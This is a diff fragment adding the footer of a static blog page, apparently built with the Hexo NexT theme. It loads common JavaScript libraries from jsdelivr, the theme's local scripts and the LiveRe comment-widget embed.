+  <script type="text/javascript" src="//cdn.jsdelivr.net/fastclick/1.0.6/fastclick.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.jsdelivr.net/jquery.lazyload/1.9.3/jquery.lazyload.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.ui.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.pack.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
